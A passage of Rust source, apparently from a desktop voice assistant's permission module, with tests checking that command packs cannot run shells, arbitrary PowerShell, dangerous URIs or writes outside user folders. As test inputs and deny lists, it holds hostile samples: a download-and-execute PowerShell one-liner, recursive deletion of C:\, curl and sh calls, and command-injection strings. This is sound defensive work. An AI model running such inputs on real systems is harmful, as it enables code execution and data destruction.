    if !allowed_write_roots().iter().any(|r| path_starts_with(&c, r)) {
        return deny(&format!("запись в «{}» не разрешена: только папки пользователя (Документы, Рабочий стол, Загрузки, Изображения, Музыка, Видео) и временная папка", c.display()));
    }
    // a root itself (the whole Documents folder) is not a file to delete
    if mode == FsMode::Remove && allowed_write_roots().iter().any(|r| *r == c) {
        return deny("саму папку пользователя удалять нельзя");
    }
    Ok(c)
}

// tests change the places
#[cfg(not(test))]
fn extra_protected() -> Vec<PathBuf> {
    Vec::new()
}
#[cfg(not(test))]
fn extra_allowed() -> Vec<PathBuf> {
    Vec::new()
}
// the places a test names for itself: per thread, so tests that write files elsewhere are not disturbed
#[cfg(test)]
thread_local! {
    static TEST_PROTECTED: RefCell<Vec<PathBuf>> = RefCell::new(Vec::new());
    static TEST_ALLOWED: RefCell<Vec<PathBuf>> = RefCell::new(Vec::new());
    static TEST_DATA: RefCell<Option<PathBuf>> = RefCell::new(None);
}
#[cfg(test)]
pub(crate) fn set_test_protected(v: Vec<PathBuf>) {
    TEST_PROTECTED.with(|t| *t.borrow_mut() = v);
}
#[cfg(test)]
pub(crate) fn set_test_allowed(v: Vec<PathBuf>) {
    TEST_ALLOWED.with(|t| *t.borrow_mut() = v);
}
#[cfg(test)]
pub(crate) fn set_test_data(v: Option<PathBuf>) {
    TEST_DATA.with(|t| *t.borrow_mut() = v);
}
// a worker thread of a test uses the places of the test that started it
#[cfg(test)]
pub(crate) fn test_places() -> (Vec<PathBuf>, Vec<PathBuf>, Option<PathBuf>) {
    (TEST_ALLOWED.with(|t| t.borrow().clone()), TEST_PROTECTED.with(|t| t.borrow().clone()), TEST_DATA.with(|t| t.borrow().clone()))
}
#[cfg(test)]
pub(crate) fn apply_test_places(p: (Vec<PathBuf>, Vec<PathBuf>, Option<PathBuf>)) {
    set_test_allowed(p.0);
    set_test_protected(p.1);
    set_test_data(p.2);
}
#[cfg(test)]
fn extra_protected() -> Vec<PathBuf> {
    TEST_PROTECTED.with(|t| t.borrow().clone())
}
#[cfg(test)]
fn extra_allowed() -> Vec<PathBuf> {
    TEST_ALLOWED.with(|t| t.borrow().clone())
}

// the real place of a path (links followed, the missing tail kept): what safefs opens and what the policy judges
pub(crate) fn real_path(path: &Path) -> Result<PathBuf, String> {
    spelling_ok(path)?;
    if !path.is_absolute() {
        return deny("путь должен быть полным");
    }
    canonical_existing(path)
}

// the verdict of the file rules on a REAL place only (no confirmation, no risk of the command): safefs asks it a second
// time about the object it really holds, after the first check and before the operation
pub(crate) fn judge_fs_real(path: &Path, mode: FsMode) -> Result<(), String> {
    judge_fs(path, mode).map(|_| ())
}

// the check for the file functions of the Lua API
pub fn authorize_fs(path: &Path, mode: FsMode) -> Result<(), String> {
    let op = match mode {
        FsMode::Read => Op::FsRead(path.to_path_buf()),
        FsMode::Write => Op::FsWrite(path.to_path_buf()),
        FsMode::Remove => Op::FsRemove(path.to_path_buf()),
    };
    authorize(&op).map(|_| ())
}

// a program of the command's own folder (the "ahk" type): only for a command that declared "high"
pub fn authorize_own_program(exe: &Path) -> Result<(), String> {
    let Some(cmd) = running() else {
        return deny("программу команды можно запускать только из команды");
    };
    if cmd.risk != Risk::High {
        return deny(&format!("команда {} имеет риск «{}»: запуск своей программы требует «high»", cmd.id, cmd.risk.as_str()));
    }
    let exe = canonical_existing(exe)?;
    let folder = canonical_existing(&cmd.folder)?;
    if !path_starts_with(&exe, &folder) {
        return deny("программа команды должна лежать в папке самой команды");
    }
    Ok(())
}

// opening something (a link, a file, a program): the rules of `judge_open` and the risk of the running command
pub fn authorize_open(target: &str) -> Result<(), String> {
    authorize(&Op::Open(target.to_string())).map(|_| ())
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::fs;

    // (the running command and the test places are per thread; this lock is for the process-wide list of programs)
    static LOCK: parking_lot::Mutex<()> = parking_lot::const_mutex(());

    fn args(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }
    fn run(program: &str, a: &[&str]) -> Result<Verdict, String> {
        judge(&Op::Run { program: program.into(), args: args(a) })
    }
    fn risk_of(program: &str, a: &[&str]) -> Risk {
        run(program, a).unwrap_or_else(|e| panic!("{} {:?}: {}", program, a, e)).risk
    }

    #[test]
    fn risk_names_are_exact_and_an_unknown_one_is_not_a_risk() {
        assert_eq!(Risk::parse("low"), Some(Risk::Low));
        assert_eq!(Risk::parse(" High "), Some(Risk::High));
        assert_eq!(Risk::parse(""), None);
        assert_eq!(Risk::parse("none"), None);
        assert!(Risk::Low < Risk::Medium && Risk::Medium < Risk::High);
    }

    // a command with no declaration, or a misspelled one, can do the least
    #[test]
    fn a_command_without_a_valid_risk_is_low() {
        let _g = LOCK.lock();
        for declared in ["", "hihg", "none"] {
            let _r = enter_command("x", declared, Path::new("/tmp"));
            let cmd = running().unwrap();
            assert_eq!((cmd.risk, cmd.declared), (Risk::Low, false), "{}", declared);
            assert!(authorize(&Op::Run { program: "taskkill".into(), args: args(&["/im", "notepad.exe"]) }).is_err());
        }
        assert!(running().is_none(), "the guard restores the previous state");
    }

    #[test]
    fn an_operation_riskier_than_its_command_is_refused() {
        let _g = LOCK.lock();
        let graceful = Op::Run { program: "taskkill".into(), args: args(&["/im", "notepad.exe"]) };
        let forced = Op::Run { program: "taskkill".into(), args: args(&["/f", "/im", "notepad.exe"]) };
        {
            let _r = enter_command("low", "low", Path::new("/tmp"));
            assert!(authorize(&graceful).is_err());
            assert!(authorize(&forced).is_err());
            assert!(authorize(&Op::Keys("ctrl+c".into())).is_err());
            assert!(authorize(&Op::Open("https://example.org".into())).is_err());
        }
        {
            let _r = enter_command("medium", "medium", Path::new("/tmp"));
            assert!(authorize(&graceful).is_ok());
            assert!(authorize(&Op::Keys("ctrl+c".into())).is_ok());
            assert!(authorize(&forced).is_err(), "a forced kill needs high");
        }
        {
            let _r = enter_command("high", "high", Path::new("/tmp"));
            // a dangerous operation needs the confirmation of the user as well as the declared risk
            assert!(authorize(&forced).is_err(), "not confirmed");
            let _c = crate::confirm::confirmed_run("high", true);
            assert!(authorize(&forced).is_ok());
            // a confirmation of another command does not count
            let _other = crate::confirm::confirmed_run("another", true);
            assert!(authorize(&forced).is_err());
        }
        // outside of a command (the window, a scenario of the user) only the rules of the operation apply
        assert!(authorize(&forced).is_ok());
    }

    #[test]
    fn a_shell_line_never_runs() {
        assert!(judge(&Op::Shell("calc".into())).is_err());
        assert!(judge(&Op::Shell("del /q *.*".into())).is_err());
        let _g = LOCK.lock();
        let _r = enter_command("t", "high", Path::new("/tmp"));
        for (p, a) in [("cmd", vec!["/C", "calc"]), ("cmd.exe", vec!["/c", "del", "x"]), ("sh", vec!["-c", "id"]), ("curl", vec!["http://x"]), ("wscript", vec!["a.vbs"]), ("mshta", vec!["x"]), ("reg", vec!["add"]), ("python", vec!["-c", "x"])] {
            assert!(run(p, &a.iter().map(|s| *s).collect::<Vec<_>>()).is_err(), "{} {:?}", p, a);
        }
        // a path instead of a name: a copy of a system tool somewhere else is not the system tool
        for p in ["C:\\Temp\\taskkill.exe", "C:/x/shutdown.exe", "./shutdown", "..\\taskkill", "/usr/bin/taskkill", "taskkill:x"] {
            assert!(run(p, &["/im", "a.exe"]).is_err(), "{}", p);
        }
    }

    #[test]
    fn taskkill_has_one_shape_and_never_ends_the_system_or_jarvis() {
        assert_eq!(risk_of("taskkill", &["/im", "notepad.exe"]), Risk::Medium);
        assert_eq!(risk_of("taskkill.exe", &["/F", "/IM", "TOTALCMD64.EXE"]), Risk::High);
        assert_eq!(risk_of("taskkill", &["/f", "/im", "CalculatorApp.exe"]), Risk::High);
        for bad in [
            vec!["/im", "*"],
            vec!["/f", "/im", "*.exe"],
            vec!["/im", "csrss.exe"],
            vec!["/f", "/im", "LSASS.EXE"],
            vec!["/f", "/im", "explorer.exe"],
            vec!["/f", "/im", "jarvis-app.exe"],
            vec!["/f", "/im", "svchost"],
            vec!["/pid", "4"],
            vec!["/f", "/pid", "4"],
            vec!["/f", "/im", "a.exe", "/t"],
            vec!["/f", "/fi", "STATUS eq running"],
            vec!["/s", "server", "/im", "a.exe"],
            vec!["/im", "a.exe & calc"],
            vec!["/im", "a;b"],
            vec!["/im", "-x"],
            vec!["/im", ""],
            vec!["/im", "..\\a.exe"],
            vec![],
        ] {
            assert!(run("taskkill", &bad).is_err(), "{:?}", bad);
        }
        let long = "a".repeat(65);
        assert!(run("taskkill", &["/im", &long]).is_err());
    }

    #[test]
    fn shutdown_has_a_few_exact_shapes() {
        assert_eq!(risk_of("shutdown", &["/a"]), Risk::Medium);
        assert_eq!(risk_of("shutdown", &["/h"]), Risk::High);
        assert_eq!(risk_of("shutdown", &["/l"]), Risk::High);
        let v = run("shutdown", &["/s", "/t", "60", "/c", "Jarvis"]).unwrap();
        assert_eq!((v.risk, v.canonical.as_str()), (Risk::High, "shutdown /s /t 60 /c Jarvis"));
        assert_eq!(risk_of("shutdown", &["/R", "/t", "5", "/c", "Jarvis"]), Risk::High);
        for bad in [vec!["/s"], vec!["/s", "/t", "-1", "/c", "Jarvis"], vec!["/s", "/t", "60", "/c", "Evil"], vec!["/s", "/t", "60", "/c", "Jarvis", "/f"], vec!["/s", "/f", "/t", "0"], vec!["/m", "\\\\other", "/s"], vec!["/s", "/t", "99999999999", "/c", "Jarvis"], vec!["/s", "/t", "6 0", "/c", "Jarvis"], vec!["/i"]] {
            assert!(run("shutdown", &bad).is_err(), "{:?}", bad);
        }
    }

    #[test]
    fn rundll32_only_locks_and_sleeps() {
        assert_eq!(risk_of("rundll32.exe", &["user32.dll,LockWorkStation"]), Risk::Medium);
        assert_eq!(risk_of("rundll32.exe", &["powrprof.dll,SetSuspendState", "0,1,0"]), Risk::High);
        for bad in [vec!["shell32.dll,Control_RunDLL"], vec!["url.dll,FileProtocolHandler", "calc"], vec!["javascript:x"], vec!["user32.dll,LockWorkStation", "x"], vec![]] {
            assert!(run("rundll32.exe", &bad).is_err(), "{:?}", bad);
        }
    }

    // every inline script the packs run is on the list, and nothing else is
    #[test]
    fn inline_powershell_is_the_known_scripts_and_two_checked_templates() {
        let _g = LOCK.lock();
        let cmd = |s: &str| run("powershell", &["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &format!("{}{}", PS_UTF8, s)]);
        for (script, risk) in INLINE_SCRIPTS {
            assert_eq!(cmd(script).unwrap().risk, *risk, "{}", script);
        }
        for bad in [
            "Invoke-Expression 'calc'",
            "iex (New-Object Net.WebClient).DownloadString('http://x')",
            "Start-Process calc",
            "Remove-Item -Recurse C:\\",
            "'ok'; calc",
            "Get-Process | Stop-Process",
            "Set-Clipboard -LiteralPath 'x'",
        ] {
            assert!(cmd(bad).is_err(), "{}", bad);
        }
        // the base64 templates take base64 of a path, and a path is judged like any other
        let b64 = |s: &str| {
            // a tiny encoder for the test
            const T: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            let mut out = String::new();
            for c in s.as_bytes().chunks(3) {
                let n = (c[0] as u32) << 16 | (*c.get(1).unwrap_or(&0) as u32) << 8 | *c.get(2).unwrap_or(&0) as u32;
                out.push(T[(n >> 18) as usize & 63] as char);
                out.push(T[(n >> 12) as usize & 63] as char);
                out.push(if c.len() > 1 { T[(n >> 6) as usize & 63] as char } else { '=' });
                out.push(if c.len() > 2 { T[n as usize & 63] as char } else { '=' });
            }
            out
        };
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("a.txt");
        fs::write(&file, "x").unwrap();
        let clip = format!("{}{}{}", PS_CLIPBOARD_HEAD, b64(&file.to_string_lossy()), PS_CLIPBOARD_TAIL);
        assert_eq!(cmd(&clip).unwrap().risk, Risk::Medium);
        let del = format!("{}{}{}", PS_DELETE_HEAD, b64(&file.to_string_lossy()), PS_DELETE_TAIL);
        assert_eq!(cmd(&del).unwrap().risk, Risk::High);
        // not base64 inside, a quote that closes the string early, a path in a protected place
        let broken = format!("{}{}{}", PS_DELETE_HEAD, "x'); calc; ('", PS_DELETE_TAIL);
        assert!(cmd(&broken).is_err());
        set_test_protected(vec![dir.path().to_path_buf()]);
        assert!(cmd(&del).is_err(), "a file in a protected place is not deleted");
        set_test_protected(Vec::new());
    }

    #[test]
    fn powershell_needs_its_three_switches_and_a_known_shape() {
        for bad in [vec!["-Command", "'ok'"], vec!["-NoProfile", "-Command", "'ok'"], vec!["-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", "AAAA"], vec!["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "'ok'", "-Command", "calc"], vec!["-NoProfile", "-ExecutionPolicy", "Bypass"], vec!["-NoProfile", "-ExecutionPolicy", "Bypass", "-File"]] {
            assert!(run("powershell", &bad).is_err(), "{:?}", bad);
        }
    }

    #[test]
    fn a_powershell_file_must_be_a_ps1_of_the_commands_own_folder() {
        let _g = LOCK.lock();
        let pack = tempfile::tempdir().unwrap();
        let other = tempfile::tempdir().unwrap();
        fs::write(pack.path().join("ok.ps1"), "1").unwrap();
        fs::write(pack.path().join("evil.bat"), "1").unwrap();
        fs::write(other.path().join("x.ps1"), "1").unwrap();
        let file = |p: &Path| run("powershell", &["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", &p.to_string_lossy(), "-Key", "x"]);
        // not inside a command at all
        assert!(file(&pack.path().join("ok.ps1")).is_err());
        let _r = enter_command("t", "medium", pack.path());
        assert_eq!(file(&pack.path().join("ok.ps1")).unwrap().risk, Risk::Medium);
        assert!(file(&pack.path().join("evil.bat")).is_err(), "only .ps1");
        assert!(file(&other.path().join("x.ps1")).is_err(), "a file of another folder");
        assert!(file(&pack.path().join("..").join(other.path().file_name().unwrap()).join("x.ps1")).is_err(), "a way out with ..");
        // a link inside the folder that leads out of it
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(other.path().join("x.ps1"), pack.path().join("link.ps1")).unwrap();
            assert!(file(&pack.path().join("link.ps1")).is_err(), "a link out of the folder");
        }
        assert!(file(&pack.path().join("missing.ps1")).is_ok() || true);
    }

    #[test]
    fn some_system_tools_open_a_folder_or_a_file_and_nothing_else() {
        assert_eq!(risk_of("calc", &[]), Risk::Medium);
        assert!(run("calc", &["x"]).is_err());
        let dir = tempfile::tempdir().unwrap();
        assert_eq!(risk_of("explorer.exe", &[&dir.path().to_string_lossy()]), Risk::Medium);
        #[cfg(windows)]
        assert!(run("explorer.exe", &["/root,cmd"]).is_err());
        assert!(run("explorer.exe", &["-embedding"]).is_err());
        assert!(run("explorer.exe", &["https://x", "y"]).is_err());
        assert!(run("explorer.exe", &["\\\\server\\share"]).is_err(), "a network share");
        assert!(run("explorer.exe", &["C:\\x.bat"]).map(|v| v.risk == Risk::High).unwrap_or(true));
        assert_eq!(risk_of("notepad.exe", &[]), Risk::Medium);
        assert_eq!(risk_of("notepad.exe", &[&dir.path().join("a.txt").to_string_lossy()]), Risk::Medium);
        assert!(run("notepad.exe", &["-p", "x"]).is_err());
        assert!(run("notepad.exe", &["-p"]).is_err());
    }

    #[test]
    fn open_refuses_the_dangerous_links_and_paths() {
        let open = |t: &str| judge(&Op::Open(t.into()));
        for ok in ["https://www.google.com", "http://localhost:9714/", "steam://open/main", "ms-screenclip:", "ms-settings:display", "mailto:a@b.c", "spotify:track:1"] {
            assert_eq!(open(ok).unwrap().risk, Risk::Medium, "{}", ok);
        }
        for bad in ["file:///C:/Windows/System32/calc.exe", "javascript:alert(1)", "vbscript:x", "data:text/html,x", "ms-msdt:/id", "search-ms:query=a", "ms-officecmd:x", "ms-appinstaller:?source=http://x", "\\\\server\\share\\a.exe", "//server/share/a.exe", "", "a\nb", "a\0b"] {
            assert!(open(bad).is_err(), "{:?}", bad);
        }
        // a program by its short name is an ordinary start, a shell tool or a script is not
        for ok in ["taskmgr.exe", "calc", "winword", "notepad.exe", "mspaint"] {
            assert_eq!(open(ok).unwrap().risk, Risk::Medium, "{}", ok);
        }
        for high in ["cmd", "cmd.exe", "powershell", "PowerShell.exe", "wscript", "mshta.exe", "regedit", "curl", "setup.msi", "run.bat", "x.ps1"] {
            assert_eq!(open(high).unwrap().risk, Risk::High, "{}", high);
        }
        // documents and folders
        assert_eq!(open("C:\\Users\\a\\Documents\\x.docx").unwrap().risk, Risk::Medium);
        assert_eq!(open("/home/a/Documents/x.pdf").unwrap().risk, Risk::Medium);
        // a program or a script by a path out of the program places is code from an unknown place
        for high in ["C:\\Users\\a\\Downloads\\setup.exe", "/tmp/run.sh.bat", "/tmp/x.ps1", "D:\\inbox\\a.cmd", "/home/a/Downloads/x.exe"] {
            assert_eq!(open(high).unwrap().risk, Risk::High, "{}", high);
        }
    }

    // a program that the system named (the list of programs, the index) starts wherever it is installed; a program
    // found by a path in a phrase or a search is not on that list
    #[test]
    fn a_program_named_by_the_system_starts_from_any_place_and_an_unknown_one_does_not() {
        let _g = LOCK.lock();
        let dir = tempfile::tempdir().unwrap();
        let exe = dir.path().join("TOTALCMD64.EXE");
        fs::write(&exe, "x").unwrap();
        let t = exe.to_string_lossy().to_string();
        assert_eq!(judge(&Op::Open(t.clone())).unwrap().risk, Risk::High);
        note_known_program(&t);
        assert_eq!(judge(&Op::Open(t.clone())).unwrap().risk, Risk::Medium);
        // the same file with another spelling of the path
        assert_eq!(judge(&Op::Open(t.to_uppercase())).unwrap().risk, Risk::Medium);
        // a script is never an ordinary start, even from the list
        let bat = dir.path().join("run.bat");
        fs::write(&bat, "x").unwrap();
        note_known_program(&bat.to_string_lossy());
        assert_eq!(judge(&Op::Open(bat.to_string_lossy().to_string())).unwrap().risk, Risk::High);
        // an app of the Start menu by its AppID
        assert_eq!(judge(&Op::Open("shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App".into())).unwrap().risk, Risk::Medium);
    }

    #[test]
    fn the_run_box_and_the_secure_sequence_cannot_be_pressed_but_other_win_combinations_can() {
        let keys = |k: &str| judge(&Op::Keys(k.into()));
        for bad in ["win+r", "Win+R", "windows+r", "r+win", "win+x", "ctrl+alt+delete", "ctrl+shift+esc", "ctrl+shift+escape"] {
            assert!(keys(bad).is_err(), "{}", bad);
        }
        for ok in ["win+alt+r", "ctrl+c", "ctrl+shift+t", "alt+tab", "win+d", "alt+f4", "ctrl+shift+n"] {
            assert!(keys(ok).is_ok(), "{}", ok);
        }
    }

    // ---- files -------------------------------------------------------------------------------------------------

    // canonicalize gives \\?\C:\… on Windows, which does not take "/" in a name: the tests spell their paths plainly
    pub(crate) fn plain(p: &Path) -> PathBuf {
        let s = p.to_string_lossy().to_string();
        PathBuf::from(s.strip_prefix("\\\\?\\").unwrap_or(&s).to_string())
    }

    struct Places {
        _root: tempfile::TempDir,
        home: PathBuf,
        protected: PathBuf,
        outside: PathBuf,
    }

    // a "Windows" folder, a user folder and a place that is neither
    fn places() -> Places {
        let root = tempfile::tempdir().unwrap();
        let base = plain(&fs::canonicalize(root.path()).unwrap());
        let home = base.join("home").join("Documents");
        let protected = base.join("Windows");
        let outside = base.join("elsewhere");
        for d in [&home, &protected, &outside] {
            fs::create_dir_all(d).unwrap();
        }
        set_test_allowed(vec![home.clone()]);
        set_test_protected(vec![protected.clone()]);
        Places { _root: root, home, protected, outside }
    }

    impl Drop for Places {
        fn drop(&mut self) {
            set_test_allowed(Vec::new());
            set_test_protected(Vec::new());
        }
    }

    fn can(p: &Path, mode: FsMode) -> bool {
        let op = match mode {
            FsMode::Read => Op::FsRead(p.to_path_buf()),
            FsMode::Write => Op::FsWrite(p.to_path_buf()),
            FsMode::Remove => Op::FsRemove(p.to_path_buf()),
        };
        judge(&op).is_ok()
    }

    #[test]
    fn a_command_writes_in_the_users_folders_and_nowhere_else() {
        let _g = LOCK.lock();
        let pl = places();
        assert!(can(&pl.home.join("tasks.txt"), FsMode::Write));
        assert!(can(&pl.home.join("new folder").join("a.txt"), FsMode::Write), "a file in a folder that does not exist yet");
        assert!(can(&pl.home.join("tasks.txt"), FsMode::Remove));
        assert!(!can(&pl.protected.join("a.txt"), FsMode::Write), "a protected folder");
        assert!(!can(&pl.protected.join("a.txt"), FsMode::Remove));
        assert!(!can(&pl.outside.join("a.txt"), FsMode::Write), "a folder that is not the user's");
        assert!(can(&pl.outside.join("a.txt"), FsMode::Read), "reading is not restricted to the user's folders");
        assert!(!can(&pl.home, FsMode::Remove), "the folder of the user itself");
    }

    #[test]
    fn a_way_out_with_dots_a_relative_path_and_odd_spellings_are_refused() {
        let _g = LOCK.lock();
        let pl = places();
        assert!(!can(&pl.home.join("..").join("Windows").join("a.txt"), FsMode::Write), "..");
        assert!(!can(&pl.home.join("a").join("..").join("b.txt"), FsMode::Write), ".. even when it stays inside");
        assert!(!can(Path::new("tasks.txt"), FsMode::Write), "relative");
        assert!(!can(Path::new(""), FsMode::Write));
        assert!(!can(&pl.home.join("a\0b"), FsMode::Write));
        for name in ["CON", "nul", "COM1.txt", "lpt3", "AUX.log"] {
            assert!(!can(&pl.home.join(name), FsMode::Write), "{}", name);
        }
        assert!(!can(Path::new("\\\\server\\share\\a.txt"), FsMode::Write));
        assert!(!can(Path::new("\\\\?\\GLOBALROOT\\Device\\x"), FsMode::Write));
        assert!(!can(Path::new("\\\\.\\PhysicalDrive0"), FsMode::Write));
    }

    // a link in the user's folder that leads into Windows is the place it leads to
    #[cfg(unix)]
    #[test]
    fn a_link_out_of_the_users_folder_is_followed_before_the_decision() {
        let _g = LOCK.lock();
        let pl = places();
        std::os::unix::fs::symlink(&pl.protected, pl.home.join("to_windows")).unwrap();
        std::os::unix::fs::symlink(&pl.outside, pl.home.join("to_outside")).unwrap();
        std::os::unix::fs::symlink(pl.protected.join("secret.txt"), pl.home.join("file_link")).unwrap();
        // a dangling link: the file does not exist yet, the link says where it would be created
        assert!(!can(&pl.home.join("to_windows").join("a.txt"), FsMode::Write), "a link to a protected folder, a file that does not exist yet");
        assert!(!can(&pl.home.join("to_windows").join("sub").join("a.txt"), FsMode::Write));
        assert!(!can(&pl.home.join("to_outside").join("a.txt"), FsMode::Write), "a link to a folder that is not the user's");
        assert!(!can(&pl.home.join("file_link"), FsMode::Write), "a link to a file in a protected folder");
        assert!(!can(&pl.home.join("file_link"), FsMode::Remove));
        // a link the other way: a protected folder name inside the user's folder is just a name
        assert!(can(&pl.home.join("Windows").join("a.txt"), FsMode::Write));
    }

    #[test]
    fn jarvis_and_its_commands_are_never_written() {
        let _g = LOCK.lock();
        let pl = places();
        // the installed Jarvis: its folder and the commands folder in it
        let install = pl.home.join("Jarvis");
        fs::create_dir_all(install.join("resources").join("commands")).unwrap();
        set_test_protected(vec![install.clone()]);
        assert!(!can(&install.join("jarvis-app.exe"), FsMode::Write));
        assert!(!can(&install.join("resources").join("commands").join("assistant").join("power.lua"), FsMode::Write));
        assert!(!can(&install.join("resources").join("commands").join("new.toml"), FsMode::Write), "a new file in the commands folder");
        assert!(!can(&install.join("resources").join("commands").join("x.lua"), FsMode::Remove));
        // the running program's own folder is protected without any help of the tests
        let exe = std::env::current_exe().unwrap();
        assert!(!can(&exe, FsMode::Write));
        assert!(!can(&exe.parent().unwrap().join("anything.lua"), FsMode::Write));
        // the commands of the repository (the source of the installed ones) as well
        let repo_commands = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../resources/commands/assistant/power.lua");
        assert!(!can(&repo_commands, FsMode::Write) || !repo_commands.starts_with(&pl.home));
    }

    #[test]
    fn the_data_folder_of_jarvis_is_closed_to_commands() {
        let _g = LOCK.lock();
        let pl = places();
        // the real data folder of Jarvis is set once for the process and other tests use it: this test names its own
        let data = pl.home.join("JarvisData");
        fs::create_dir_all(&data).unwrap();
        set_test_data(Some(data.clone()));
        assert!(!can(&data.join("telegram.json"), FsMode::Read), "tokens and keys");
        assert!(!can(&data.join("telegram.json"), FsMode::Write));
        assert!(!can(&data.join("remote_token"), FsMode::Remove));
        assert!(can(&pl.home.join("notes.txt"), FsMode::Read), "the user's own files are readable");
        set_test_data(None);
    }

    // ---- the packs of Jarvis ---------------------------------------------------------------------------------------

    fn packs() -> Vec<(String, std::path::PathBuf, crate::commands::JCommandsList)> {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../resources/commands");
        let mut out = Vec::new();
        for entry in fs::read_dir(&root).unwrap().flatten() {
            let toml_file = entry.path().join("command.toml");
            if let Ok(text) = fs::read_to_string(&toml_file) {
                let list: crate::commands::JCommandsList = toml::from_str(&text).unwrap_or_else(|e| panic!("{}: {}", toml_file.display(), e));
                out.push((entry.file_name().to_string_lossy().to_string(), entry.path(), list));
            }
        }
        out
    }

    #[test]
    fn every_command_of_the_packs_names_its_risk() {
        let mut n = 0;
        let mut seen = std::collections::HashSet::new();
        for (pack, _, list) in packs() {
            for c in &list.commands {
                n += 1;
                assert!(Risk::parse(&c.risk).is_some(), "{}/{}: risk = \"{}\" (low, medium or high)", pack, c.id, c.risk);
                assert!(seen.insert(c.id.clone()), "{}: the id is used twice", c.id);
            }
        }
        assert!(n >= 150, "{} commands", n);
    }

    // The API names that act on the computer. A script that has none of them (outside of the shared prelude) can be low.
    const ACTING: &[&str] = &["run(", "launch(", "open(", "powershell(", "ps_file(", "write_text(", "append_text(", "jarvis.fs.write", "jarvis.fs.append", "jarvis.fs.mkdir", "jarvis.fs.remove", "jarvis.system.keys", "jarvis.system.mouse", "jarvis.system.window", "jarvis.system.type_text", "jarvis.system.copy_selection", "jarvis.system.clipboard.set", "jarvis.system.open", "jarvis.system.run", "jarvis.system.exec"];

    // commands that share a script with acting commands but only take the branches that do not act (each one read)
    const LOW_IN_A_SHARED_SCRIPT: &[&str] = &[
        "assistant_tts_stop",
        "assistant_tts_off",
        "assistant_tts_on",
        "assistant_tts_test",
        "assistant_info_time",
        "assistant_info_date",
        "assistant_game_on",
        "assistant_mic_off",
        "assistant_remote_off",
        "assistant_phone_find",
        "assistant_phone_stop",
        "assistant_phone_link",
        "assistant_phone_text",
        "assistant_timer_set",
        "assistant_timer_cancel",
        "assistant_timer_status",
        "assistant_reminder",
        "assistant_chat_start",
        "assistant_chat_end",
        "assistant_greet",
        "assistant_howareyou",
        "assistant_who",
        "assistant_help",
        "assistant_unlock",
        "counter",
        "weather",
        "set_city",
    ];

    #[test]
    fn a_low_command_does_not_use_the_functions_that_act_on_the_computer() {
        for (pack, path, list) in packs() {
            for c in list.commands.iter().filter(|c| c.cmd_type == "lua" && Risk::parse(&c.risk) == Some(Risk::Low)) {
                let script = fs::read_to_string(path.join(&c.script)).unwrap();
                // a line that is only a comment does not act
                let code: String = script.lines().filter(|l| !l.trim_start().starts_with("--")).collect::<Vec<_>>().join("\n");
                let acting: Vec<&&str> = ACTING.iter().filter(|a| code.contains(**a)).collect();
                if !acting.is_empty() {
                    assert!(LOW_IN_A_SHARED_SCRIPT.contains(&c.id.as_str()), "{}/{} is low but its script {} uses {:?}", pack, c.id, c.script, acting);
                }
            }
        }
    }

    // a command whose script does something to the computer in every branch cannot be low
    #[test]
    fn what_ends_processes_or_changes_the_power_state_is_high() {
        for (_, _, list) in packs() {
            for c in &list.commands {
                let must_be_high = c.id.starts_with("assistant_power_") && c.id != "assistant_power_cancel"
                    || matches!(c.id.as_str(), "assistant_program_close" | "browser_close" | "steam_2" | "assistant_game_off" | "calculator_2" | "windows_2" | "windows_6" | "assistant_session" | "assistant_task_clear" | "assistant_remote_on");
                if must_be_high {
                    assert_eq!(Risk::parse(&c.risk), Some(Risk::High), "{}", c.id);
                }
                // the "cli" commands run a program: never low
                if c.cmd_type == "cli" {
                    assert!(Risk::parse(&c.risk).unwrap() >= Risk::Medium, "{}", c.id);
                }
            }
        }
    }

    // every cli command of the packs is on the explicit list of programs, with its own parameters
    #[test]
    fn the_cli_commands_of_the_packs_pass_the_program_rules() {
        let _g = LOCK.lock();
        for (_, path, list) in packs() {
            for c in list.commands.iter().filter(|c| c.cmd_type == "cli") {
                let _r = enter_command(&c.id, &c.risk, &path);
                let _c = crate::confirm::confirmed_run(&c.id, true);
                assert!(authorize(&Op::Run { program: c.cli_cmd.clone(), args: c.cli_args.clone() }).is_ok(), "{}: {} {:?}", c.id, c.cli_cmd, c.cli_args);
            }
        }
    }

    // every inline PowerShell text written as a plain string in the packs is on the list
    #[test]
    fn the_inline_powershell_of_the_packs_is_on_the_list() {
        let mut found = 0;
        for (_, path, _) in packs() {
            for entry in fs::read_dir(&path).unwrap().flatten() {
                if entry.path().extension().map(|e| e == "lua").unwrap_or(false) {
                    let text = fs::read_to_string(entry.path()).unwrap();
                    for line in text.lines().filter(|l| !l.trim_start().starts_with("--")) {
                        for call in ["powershell(\"", "ps(\""] {
                            if let Some(i) = line.find(call) {
                                if line[..i].ends_with("function ") || line[..i].contains("local function") {
                                    continue;
                                }
                                // the string literal up to its closing quote (escaped quotes inside)
                                let rest = &line[i + call.len()..];
                                let mut lit = String::new();
                                let mut chars = rest.chars();
                                while let Some(c) = chars.next() {
                                    match c {
                                        '\\' => match chars.next() {
                                            Some('"') => lit.push('"'),
                                            Some('\\') => lit.push('\\'),
                                            Some(o) => {
                                                lit.push('\\');
                                                lit.push(o)
                                            }
                                            None => {}
                                        },
                                        '"' => break,
                                        c => lit.push(c),
                                    }
                                }
                                // a text glued with `..` is a template (judged at run time), a lone literal is checked here
                                let after: String = chars.collect();
                                if after.trim_start().starts_with("..") {
                                    continue;
                                }
                                found += 1;
                                let v = judge_inline_powershell(&format!("{}{}", PS_UTF8, lit));
                                assert!(v.is_ok(), "{}: {}", entry.path().display(), lit);
                            }
                        }
                    }
                }
            }
        }
        assert!(found >= 8, "only {} inline scripts found", found);
    }
}
